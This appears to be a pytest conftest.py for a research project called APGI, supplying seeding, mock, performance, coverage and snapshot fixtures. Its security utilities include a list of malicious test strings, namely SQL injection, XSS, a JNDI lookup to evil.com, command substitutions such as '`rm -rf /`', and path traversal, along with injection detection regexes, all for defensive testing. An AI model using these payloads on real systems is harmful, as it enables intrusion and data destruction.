"""
================================================================================
COMPREHENSIVE ADVERSARIAL TEST INFRASTRUCTURE
================================================================================

This module provides the core testing infrastructure for APGI including:
- Deterministic fixtures with controlled seeding
- Mock factories for external dependencies
- Performance monitoring fixtures
- Security testing utilities
- Coverage tracking utilities
"""

from __future__ import annotations

import gc
import hashlib
import json
import logging
import os
import random
import re
import sys
import tempfile
import threading
import time
import tracemalloc
import warnings
from collections.abc import Callable, Generator
from contextlib import contextmanager
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union
from unittest.mock import MagicMock

import numpy as np
import pytest

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

# Configure logging for tests
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)

# Silence matplotlib and other verbose loggers
logging.getLogger("matplotlib").setLevel(logging.WARNING)

# =============================================================================
# DETERMINISTIC SEEDING AND REPRODUCIBILITY
# =============================================================================

DETERMINISTIC_SEED = 43


def set_deterministic_seed(seed: int = DETERMINISTIC_SEED) -> None:
    """Set all random seeds for deterministic reproducibility."""
    random.seed(seed)
    np.random.seed(seed)
    # For torch if available
    try:
        import torch

        torch.manual_seed(seed)
        if torch.cuda.is_available():
            torch.cuda.manual_seed_all(seed)
        torch.backends.cudnn.deterministic = True
        torch.backends.cudnn.benchmark = False
    except ImportError:
        pass


@pytest.fixture(scope="session", autouse=True)
def deterministic_environment() -> Generator[None, None, None]:
    """Ensure deterministic environment for all tests."""
    # Set deterministic seeds
    set_deterministic_seed(DETERMINISTIC_SEED)

    # Store original environment
    original_env = dict(os.environ)

    # Set test environment variables
    os.environ["TESTING"] = "1"
    os.environ["PYTHONHASHSEED"] = str(DETERMINISTIC_SEED)

    # Set required environment variables for APGI modules (fixes BUG-H009)
    if "APGI_AUDIT_KEY" not in os.environ:
        # Use a dummy but valid key (32 bytes)
        os.environ["APGI_AUDIT_KEY"] = "0" * 64

    if "APGI_CONFIG_SECRET_KEY" not in os.environ:
        os.environ["APGI_CONFIG_SECRET_KEY"] = "test_secret_key_for_config_validation"

    if "APGI_KMS_KEY" not in os.environ:
        os.environ["APGI_KMS_KEY"] = "test_kms_key_for_security_adapters"

    yield

    # Restore original environment
    os.environ.clear()
    os.environ.update(original_env)


@pytest.fixture(autouse=True)
def reset_random_state() -> Generator[None, None, None]:
    """Reset random state before each test for isolation."""
    set_deterministic_seed(DETERMINISTIC_SEED)
    yield


@pytest.fixture(autouse=True)
def restore_matplotlib_modules() -> Generator[None, None, None]:
    """Ensure matplotlib modules are properly restored after tests that mock them."""
    # Store original matplotlib modules before test
    original_modules = {}
    for key in list(sys.modules.keys()):
        if key.startswith("matplotlib"):
            original_modules[key] = sys.modules[key]

    yield

    # After test: restore any matplotlib modules that were removed or replaced
    for key, module in original_modules.items():
        if key not in sys.modules or sys.modules[key] is not module:
            sys.modules[key] = module

    # Also ensure matplotlib.pyplot is properly restored if it was partially mocked
    if "matplotlib.pyplot" in sys.modules:
        try:
            import matplotlib.pyplot as plt

            plt.close("all")
        except Exception:
            pass


@pytest.fixture(autouse=True)
def restore_apgi_modules() -> Generator[None, None, None]:
    """Ensure APGI modules are properly restored after tests that mock them."""
    # Modules to protect from mock pollution
    apgi_modules = [
        "apgi_integration",
        "ultimate_apgi_template",
        "run_attentional_blink",
        "run_go_no_go",
        "run_stroop_effect",
        "run_sternberg_memory",
        "experiment_apgi_integration",
        "standard_apgi_runner",
        "apgi_audit",
        "apgi_config",
        "apgi_metrics",
    ]

    # Pre-load real modules before any test can mock them
    # This ensures we have the real modules to restore later
    for mod_name in apgi_modules:
        if mod_name not in sys.modules:
            try:
                __import__(mod_name)
            except Exception:
                pass  # Module may not exist, that's ok

    # Store original modules before test (after pre-loading)
    original_modules = {}
    for key in list(sys.modules.keys()):
        if any(key.startswith(mod) or key == mod for mod in apgi_modules):
            original_modules[key] = sys.modules[key]

    yield

    # After test: remove any apgi modules that may have been mocked
    # This forces fresh imports on next test
    for key in list(sys.modules.keys()):
        if any(key.startswith(mod) or key == mod for mod in apgi_modules):
            if (
                key not in original_modules
                or sys.modules[key] is not original_modules[key]
            ):
                # Module was replaced or added with mock - remove it
                sys.modules.pop(key, None)


# =============================================================================
# FIXTURE FACTORIES FOR TEST DATA GENERATION
# =============================================================================


class AdversarialDataFactory:
    """Factory for generating adversarial test data including edge cases."""

    @staticmethod
    def edge_case_floats() -> List[float]:
        """Return edge case floating point values."""
        return [
            0.0,
            -0.0,
            1.0,
            -1.0,
            float("inf"),
            float("-inf"),
            float("nan"),
            sys.float_info.max,
            sys.float_info.min,
            sys.float_info.epsilon,
            -sys.float_info.max,
            1e-308,  # Near underflow
            1e308,  # Near overflow
            1e-323,  # Denormal
        ]

    @staticmethod
    def edge_case_ints() -> List[int]:
        """Return edge case integer values."""
        return [
            0,
            1,
            -1,
            sys.maxsize,
            -sys.maxsize - 1,
            2**31 - 1,
            -(2**31),
            2**63 - 1,
            -(2**63),
        ]

    @staticmethod
    def malicious_strings() -> List[str]:
        """Return strings that might cause injection or parsing issues."""
        return [
            "",
            "' OR '1'='1",
            "; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com}",
            "$(whoami)",
            "`rm -rf /`",
            "%s%s%s%s%n",
            "\x00",
            "\xff",
            "\u0000",
            "\n\r\t",
            "   ",
            "\x1b[31m",  # ANSI escape
            "../..\\etc\\passwd",
            "file:///etc/passwd",
            "data:text/html,<script>alert(1)</script>",
            "A" * 10000,  # Very long string
            "🔥🚀💻",  # Unicode emojis
            "日本語テスト",  # Non-ASCII
            "\u202e",  # Right-to-left override
        ]

    @staticmethod
    def numpy_edge_cases(shape: Tuple[int, ...] = (3, 3)) -> List[np.ndarray]:
        """Return numpy arrays with edge case values."""
        arrays = [
            np.zeros(shape),
            np.ones(shape),
            np.full(shape, np.nan),
            np.full(shape, np.inf),
            np.full(shape, -np.inf),
            np.eye(shape[0]) if len(shape) == 2 else np.zeros(shape),
            np.random.rand(*shape) * 1e-300,  # Near underflow
            np.random.rand(*shape) * 1e300,  # Near overflow
        ]
        # Add arrays with mixed types if possible
        if len(shape) == 1:
            mixed = np.array([1, 2.5, None, "string"], dtype=object)
            arrays.append(mixed)
        return arrays


@pytest.fixture
def data_factory() -> AdversarialDataFactory:
    """Provide adversarial data factory."""
    return AdversarialDataFactory()


# =============================================================================
# MOCK FACTORIES FOR EXTERNAL DEPENDENCIES
# =============================================================================


class MockFactory:
    """Factory for creating mocks of external dependencies."""

    @staticmethod
    def mock_matplotlib() -> MagicMock:
        """Create mock matplotlib with all common functions."""
        mock = MagicMock()
        mock.pyplot.figure.return_value = MagicMock()
        mock.pyplot.plot.return_value = []
        mock.pyplot.scatter.return_value = []
        mock.pyplot.hist.return_value = ([], [], [])
        mock.pyplot.subplot.return_value = MagicMock()
        mock.pyplot.savefig.return_value = None
        mock.pyplot.close.return_value = None
        mock.use.return_value = None
        return mock

    @staticmethod
    def mock_requests() -> MagicMock:
        """Create mock requests session."""
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"status": "ok"}
        mock_response.text = '{"status": "ok"}'
        mock_response.raise_for_status.return_value = None
        mock_response.content = b'{"status": "ok"}'
        mock_response.headers = {"Content-Type": "application/json"}

        mock = MagicMock()
        mock.get.return_value = mock_response
        mock.post.return_value = mock_response
        mock.put.return_value = mock_response
        mock.delete.return_value = mock_response
        mock.request.return_value = mock_response
        return mock

    @staticmethod
    def mock_database() -> MagicMock:
        """Create mock database connection."""
        mock = MagicMock()
        mock.cursor.return_value = MagicMock()
        mock.execute.return_value = None
        mock.fetchall.return_value = []
        mock.fetchone.return_value = None
        mock.commit.return_value = None
        mock.rollback.return_value = None
        mock.close.return_value = None
        return mock

    @staticmethod
    def mock_file_system() -> Dict[str, Any]:
        """Create mock file system structure."""
        return {
            "exists": MagicMock(return_value=True),
            "isfile": MagicMock(return_value=True),
            "isdir": MagicMock(return_value=True),
            "mkdir": MagicMock(return_value=None),
            "open": MagicMock(return_value=MagicMock()),
            "listdir": MagicMock(return_value=[]),
            "remove": MagicMock(return_value=None),
        }


@pytest.fixture
def mock_factory() -> MockFactory:
    """Provide mock factory."""
    return MockFactory()


# =============================================================================
# PERFORMANCE AND RESOURCE MONITORING FIXTURES
# =============================================================================


@dataclass
class PerformanceMetrics:
    """Container for performance metrics collected during test execution."""

    execution_time: float = 0.0
    peak_memory_mb: float = 0.0
    cpu_percent: float = 0.0
    gc_collections: Tuple[int, int, int] = (0, 0, 0)
    thread_count: int = 0
    call_count: int = 0
    errors: List[str] = field(default_factory=list)


@contextmanager
def measure_performance(
    threshold_ms: Optional[float] = None,
) -> Generator[PerformanceMetrics, None, None]:
    """Context manager to measure performance metrics."""
    metrics = PerformanceMetrics()

    # Start memory tracking
    tracemalloc.start()
    gc.collect()
    gc_before = gc.get_count()
    start_time = time.perf_counter()

    try:
        yield metrics
    finally:
        end_time = time.perf_counter()
        metrics.execution_time = (end_time - start_time) * 1000  # Convert to ms

        # Memory metrics
        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()
        metrics.peak_memory_mb = peak / 1024 / 1024

        # GC metrics
        gc_after = gc.get_count()
        metrics.gc_collections = (
            gc_after[0] - gc_before[0],
            gc_after[1] - gc_before[1],
            gc_after[2] - gc_before[2],
        )

        # Thread count
        metrics.thread_count = threading.active_count()

        # Check threshold
        if threshold_ms and metrics.execution_time > threshold_ms:
            metrics.errors.append(
                f"Execution time {metrics.execution_time:.2f}ms exceeded threshold {threshold_ms}ms"
            )


@pytest.fixture
def performance_monitor() -> Callable[..., Any]:
    """Provide performance monitoring context manager."""
    return measure_performance


# =============================================================================
# TEMPORARY FILE AND DIRECTORY FIXTURES
# =============================================================================


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Provide temporary directory for file operations."""
    with tempfile.TemporaryDirectory() as tmp:
        yield Path(tmp)


@pytest.fixture
def temp_json_file(temp_dir: Path) -> Callable[..., Path]:
    """Factory for creating temporary JSON files."""

    def _create(data: Dict[str, Any], filename: str = "test.json") -> Path:
        path = temp_dir / filename
        with open(path, "w") as f:
            json.dump(data, f)
        return path

    return _create


@pytest.fixture
def temp_numpy_file(temp_dir: Path) -> Callable[..., Path]:
    """Factory for creating temporary numpy files."""

    def _create(arr: np.ndarray, filename: str = "test.npy") -> Path:
        path = temp_dir / filename
        np.save(path, arr)
        return path

    return _create


# =============================================================================
# SECURITY TESTING UTILITIES
# =============================================================================


class SecurityTester:
    """Utilities for security testing."""

    SQL_INJECTION_PATTERNS = [
        r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
        r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
        r"\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))",
        r"((\%27)|(\'))union",
        r"exec(\s|\+)+(s|x)p\w+",
        r"UNION\s+SELECT",
        r"SELECT\s+.*FROM",
        r"INSERT\s+INTO",
        r"DELETE\s+FROM",
        r"DROP\s+TABLE",
    ]

    XSS_PATTERNS = [
        r"<script[^>]*>.*?</script>",
        r"javascript:",
        r"on\w+\s*=",
        r"<iframe",
        r"<object",
        r"<embed",
    ]

    @classmethod
    def detect_sql_injection(cls, value: str) -> List[str]:
        """Detect potential SQL injection patterns."""
        matches = []
        for pattern in cls.SQL_INJECTION_PATTERNS:
            if re.search(pattern, value, re.IGNORECASE):
                matches.append(pattern)
        return matches

    @classmethod
    def detect_xss(cls, value: str) -> List[str]:
        """Detect potential XSS patterns."""
        matches = []
        for pattern in cls.XSS_PATTERNS:
            if re.search(pattern, value, re.IGNORECASE):
                matches.append(pattern)
        return matches

    @classmethod
    def sanitize_input(cls, value: str) -> str:
        """Basic input sanitization for testing purposes."""
        # Remove null bytes
        value = value.replace("\x00", "")
        # Limit length
        value = value[:10000]
        # Escape HTML
        value = (
            value.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
        )
        return value


@pytest.fixture
def security_tester() -> SecurityTester:
    """Provide security testing utilities."""
    return SecurityTester()


# =============================================================================
# CONCURRENCY AND RACE CONDITION FIXTURES
# =============================================================================


@pytest.fixture
def race_condition_detector() -> Callable[..., bool]:
    """Provide race condition detection utility."""

    def detect_race(
        target: Callable[..., Any],
        num_threads: int = 10,
        iterations: int = 100,
    ) -> bool:
        """Detect potential race conditions by concurrent execution."""
        errors: List[Exception] = []
        results: List[Any] = []
        lock = threading.Lock()

        def worker() -> None:
            for _ in range(iterations):
                try:
                    result = target()
                    with lock:
                        results.append(result)
                except Exception as e:
                    with lock:
                        errors.append(e)

        threads = [threading.Thread(target=worker) for _ in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        return len(errors) > 0 or len(set(str(r) for r in results)) > 1

    return detect_race


@pytest.fixture
def thread_pool() -> Generator[List[threading.Thread], None, None]:
    """Provide thread pool for concurrency testing."""
    threads: List[threading.Thread] = []
    yield threads
    # Cleanup
    for t in threads:
        if t.is_alive():
            # Note: Cannot truly kill threads in Python, but we can mark them
            pass


# =============================================================================
# COVERAGE AND METRICS COLLECTION
# =============================================================================


@dataclass
class CoverageGap:
    """Represents a coverage gap identified during testing."""

    module: str
    function: str
    line_start: int
    line_end: int
    branch_id: Optional[str] = None
    reason: str = ""


class CoverageTracker:
    """Track code coverage gaps and recommendations."""

    def __init__(self) -> None:
        self.gaps: List[CoverageGap] = []
        self.tested_lines: set = set()
        self.tested_branches: set = set()

    def add_gap(self, gap: CoverageGap) -> None:
        """Record a coverage gap."""
        self.gaps.append(gap)

    def record_coverage(
        self, module: str, line: int, branch: Optional[str] = None
    ) -> None:
        """Record that a line/branch was covered."""
        self.tested_lines.add((module, line))
        if branch:
            self.tested_branches.add((module, branch))

    def get_report(self) -> Dict[str, Any]:
        """Generate coverage report."""
        return {
            "total_gaps": len(self.gaps),
            "gaps": [
                {
                    "module": g.module,
                    "function": g.function,
                    "lines": f"{g.line_start}-{g.line_end}",
                    "branch": g.branch_id,
                    "reason": g.reason,
                }
                for g in self.gaps
            ],
            "coverage_stats": {
                "lines_covered": len(self.tested_lines),
                "branches_covered": len(self.tested_branches),
            },
        }


@pytest.fixture
def coverage_tracker() -> CoverageTracker:
    """Provide coverage tracking utility."""
    return CoverageTracker()


# =============================================================================
# SNAPSHOT TESTING FIXTURES
# =============================================================================


class SnapshotManager:
    """Manage snapshot testing for regression detection."""

    def __init__(self, snapshot_dir: Path) -> None:
        self.snapshot_dir = snapshot_dir
        self.snapshot_dir.mkdir(parents=True, exist_ok=True)

    def _get_snapshot_path(self, test_name: str) -> Path:
        """Get path for snapshot file."""
        return self.snapshot_dir / f"{test_name}.snap"

    def _compute_hash(self, data: Any) -> str:
        """Compute hash of data for comparison."""
        if isinstance(data, np.ndarray):
            data = data.tobytes()
        elif not isinstance(data, (str, bytes)):
            data = json.dumps(data, sort_keys=True, default=str)
        if isinstance(data, str):
            data = data.encode()
        return hashlib.sha256(data).hexdigest()[:16]

    def assert_match(self, test_name: str, data: Any, update: bool = False) -> bool:
        """Assert that data matches stored snapshot."""
        snapshot_path = self._get_snapshot_path(test_name)
        current_hash = self._compute_hash(data)

        if not snapshot_path.exists() or update:
            snapshot_path.write_text(current_hash)
            return True

        stored_hash = snapshot_path.read_text().strip()
        return current_hash == stored_hash


@pytest.fixture
def snapshot_manager(temp_dir: Path) -> SnapshotManager:
    """Provide snapshot manager for regression testing."""
    return SnapshotManager(temp_dir / "snapshots")


# =============================================================================
# ASSERTION HELPERS
# =============================================================================


class AdversarialAssertions:
    """Additional assertion helpers for adversarial testing."""

    @staticmethod
    def assert_nan_free(
        arr: np.ndarray, msg: str = "Array contains NaN values"
    ) -> None:
        """Assert array has no NaN values."""
        assert not np.any(np.isnan(arr)), msg  # nosec: B101 - Test assertion

    @staticmethod
    def assert_finite(
        arr: np.ndarray, msg: str = "Array contains infinite values"
    ) -> None:
        """Assert array has no infinite values."""
        assert np.all(np.isfinite(arr)), msg  # nosec: B101 - Test assertion

    @staticmethod
    def assert_shape(
        arr: np.ndarray, expected: Tuple[int, ...], msg: Optional[str] = None
    ) -> None:
        """Assert array has expected shape."""
        if msg is None:
            msg = f"Expected shape {expected}, got {arr.shape}"
        assert arr.shape == expected, msg  # nosec: B101 - Test assertion

    @staticmethod
    def assert_dtype(
        arr: np.ndarray, expected: Union[type, np.dtype], msg: Optional[str] = None
    ) -> None:
        """Assert array has expected dtype."""
        if msg is None:
            msg = f"Expected dtype {expected}, got {arr.dtype}"
        assert arr.dtype == expected, msg

    @staticmethod
    def assert_monotonic(
        arr: np.ndarray, increasing: bool = True, msg: Optional[str] = None
    ) -> None:
        """Assert array is monotonic."""
        diff = np.diff(arr)
        if increasing:
            condition = np.all(diff >= 0)
        else:
            condition = np.all(diff <= 0)
        if msg is None:
            direction = "increasing" if increasing else "decreasing"
            msg = f"Array is not {direction}"
        assert condition, msg

    @staticmethod
    def assert_within_bounds(
        arr: np.ndarray, low: float, high: float, msg: Optional[str] = None
    ) -> None:
        """Assert all values are within bounds."""
        if msg is None:
            msg = f"Values not within bounds [{low}, {high}]"
        assert np.all((arr >= low) & (arr <= high)), msg


@pytest.fixture
def adv_assert() -> AdversarialAssertions:
    """Provide adversarial assertion helpers."""
    return AdversarialAssertions()


# =============================================================================
# WARNING AND ERROR CAPTURE
# =============================================================================


@pytest.fixture
def capture_warnings() -> Generator[List[warnings.WarningMessage], None, None]:
    """Capture all warnings during test execution."""
    with warnings.catch_warnings(record=True) as w:
        warnings.simplefilter("always")
        yield w


@pytest.fixture
def assert_no_warnings(
    capture_warnings: List[warnings.WarningMessage],
) -> Callable[..., None]:
    """Assert no warnings were raised."""

    def checker(expected_count: int = 0) -> None:
        actual_count = len(capture_warnings)
        if actual_count != expected_count:
            warning_list = "\n".join(str(w.message) for w in capture_warnings)
            raise AssertionError(
                f"Expected {expected_count} warnings, got {actual_count}:\n{warning_list}"
            )

    return checker


# =============================================================================
# CONFIGURATION VALIDATION FIXTURES
# =============================================================================


@pytest.fixture
def valid_config() -> Dict[str, Any]:
    """Provide a valid configuration dictionary for testing."""
    return {
        "experiment_name": "test_experiment",
        "participant_id": "TEST_001",
        "n_trials": 100,
        "duration_ms": 2000,
        "isi_range": [500, 1000],
        "stimulus_duration_ms": 200,
        "random_seed": 42,
        "output_dir": "/tmp/test_output",
        "save_results": True,
        "verbose": False,
        "apgi_params": {
            "tau_S": 0.35,
            "tau_theta": 30.0,
            "theta_0": 0.5,
            "alpha": 5.5,
            "beta": 1.5,
            "rho": 0.7,
            "sigma_S": 0.05,
            "sigma_theta": 0.02,
        },
    }


@pytest.fixture
def invalid_configs() -> List[Dict[str, Any]]:
    """Provide various invalid configurations for testing validation."""
    return [
        {},  # Empty config
        {"experiment_name": None},  # None values
        {"n_trials": -1},  # Negative values
        {"n_trials": 0},  # Zero values
        {"duration_ms": float("inf")},  # Infinite values
        {"random_seed": "not_a_number"},  # Wrong types
        {"isi_range": [1000, 500]},  # Invalid range (min > max)
        {"isi_range": [500]},  # Incomplete range
        {"apgi_params": {"tau_S": 2.0}},  # Out of range parameter
        {"unknown_key": "value"},  # Unknown keys
    ]


# =============================================================================
# PYTEST CONFIGURATION HOOKS
# =============================================================================


def pytest_load_initial_conftests(
    early_config: pytest.Config, parser: Any, args: list
) -> None:
    """Hook that runs before coverage is initialized."""
    # Remove --cov-fail-under if running benchmark tests
    if any("test_apgi_benchmarks.py" in arg for arg in args):
        for arg in list(args):
            if "--cov-fail-under" in arg:
                idx = args.index(arg)
                args.pop(idx)
                if idx + 1 < len(args) and not args[idx + 1].startswith("-"):
                    args.pop(idx)


def pytest_sessionstart(session: pytest.Session) -> None:
    """Hook that runs before test collection - preload critical modules."""
    # Pre-load modules that might be mocked at module level by test files
    # This ensures we have the real modules loaded before any test file imports
    critical_modules = [
        "apgi_integration",
        "apgi_audit",
        "apgi_config",
        "apgi_metrics",
        "apgi_security",
        "experiment_apgi_integration",
        "standard_apgi_runner",
        "ultimate_apgi_template",
    ]
    for mod_name in critical_modules:
        try:
            __import__(mod_name)
        except Exception:
            pass  # Module may not exist, that's ok


def pytest_configure(config: pytest.Config) -> None:
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')"
    )
    config.addinivalue_line("markers", "integration: marks tests as integration tests")
    config.addinivalue_line("markers", "e2e: marks tests as end-to-end tests")
    config.addinivalue_line("markers", "security: marks tests as security tests")
    config.addinivalue_line("markers", "performance: marks tests as performance tests")
    config.addinivalue_line("markers", "stress: marks tests as stress tests")
    config.addinivalue_line("markers", "mutation: marks tests for mutation testing")
    config.addinivalue_line("markers", "snapshot: marks tests as snapshot tests")
    config.addinivalue_line(
        "markers", "race_condition: marks tests that check for race conditions"
    )
    config.addinivalue_line(
        "markers", "adversarial: marks tests using adversarial data"
    )
    config.addinivalue_line(
        "markers", "boundary: marks tests for boundary value analysis"
    )
    config.addinivalue_line("markers", "flaky: marks tests that may be flaky")


def pytest_collection_modifyitems(
    config: pytest.Config, items: List[pytest.Item]
) -> None:
    """Modify test collection to add markers based on test name."""
    # Check if only benchmark tests are being run
    has_benchmark = any(item.get_closest_marker("benchmark") for item in items)
    all_benchmark = all(item.get_closest_marker("benchmark") for item in items)

    # If only benchmark tests are selected, disable coverage fail-under
    if has_benchmark and all_benchmark:
        if hasattr(config.option, "cov_fail_under"):
            config.option.cov_fail_under = None

    for item in items:
        # Auto-mark based on test name patterns
        if "stress" in item.nodeid.lower():
            item.add_marker(pytest.mark.stress)
        if "perf" in item.nodeid.lower() or "benchmark" in item.nodeid.lower():
            item.add_marker(pytest.mark.performance)
        if "security" in item.nodeid.lower():
            item.add_marker(pytest.mark.security)
        if "race" in item.nodeid.lower() or "concurrent" in item.nodeid.lower():
            item.add_marker(pytest.mark.race_condition)
        if "adversarial" in item.nodeid.lower():
            item.add_marker(pytest.mark.adversarial)
        if "boundary" in item.nodeid.lower() or "edge" in item.nodeid.lower():
            item.add_marker(pytest.mark.boundary)
        if "integration" in item.nodeid.lower():
            item.add_marker(pytest.mark.integration)
        if "e2e" in item.nodeid.lower():
            item.add_marker(pytest.mark.e2e)


# =============================================================================
# TEST EXECUTION HOOKS FOR REPORTING
# =============================================================================


test_results: Dict[str, Dict[str, Any]] = {}


def pytest_runtest_setup(item: pytest.Item) -> None:
    """Setup before each test."""
    test_results[item.nodeid] = {"start_time": time.time(), "status": "running"}


def pytest_runtest_teardown(item: pytest.Item, nextitem: Optional[pytest.Item]) -> None:
    """Teardown after each test."""
    if item.nodeid in test_results:
        test_results[item.nodeid]["duration"] = (
            time.time() - test_results[item.nodeid]["start_time"]
        )


def pytest_runtest_logreport(report: pytest.TestReport) -> None:
    """Preserve failures across setup, call and teardown reports."""
    result = test_results.setdefault(report.nodeid, {"status": "running"})
    if report.failed:
        result["status"] = "failed"
        result["error"] = str(report.longrepr)
    elif result["status"] != "failed":
        if report.skipped:
            result["status"] = "skipped"
        elif report.when == "call" and result["status"] != "skipped":
            result["status"] = "passed"


def pytest_sessionfinish(session: pytest.Session, exitstatus: int) -> None:
    """Generate final test report."""
    report_path = Path("test_reports")
    report_path.mkdir(exist_ok=True)

    summary = {
        "total_tests": len(test_results),
        "passed": sum(1 for r in test_results.values() if r["status"] == "passed"),
        "failed": sum(1 for r in test_results.values() if r["status"] == "failed"),
        "skipped": sum(1 for r in test_results.values() if r["status"] == "skipped"),
        "total_duration": sum(r.get("duration", 0) for r in test_results.values()),
        "test_details": test_results,
    }

    with open(report_path / "test_summary.json", "w") as f:
        json.dump(summary, f, indent=2, default=str)

    print(f"\n{'=' * 60}")
    print(f"Test Summary: {summary['passed']}/{summary['total_tests']} passed")
    print(f"Total Duration: {summary['total_duration']:.2f}s")
    print(f"Report saved to: {report_path / 'test_summary.json'}")
    print(f"{'=' * 60}\n")
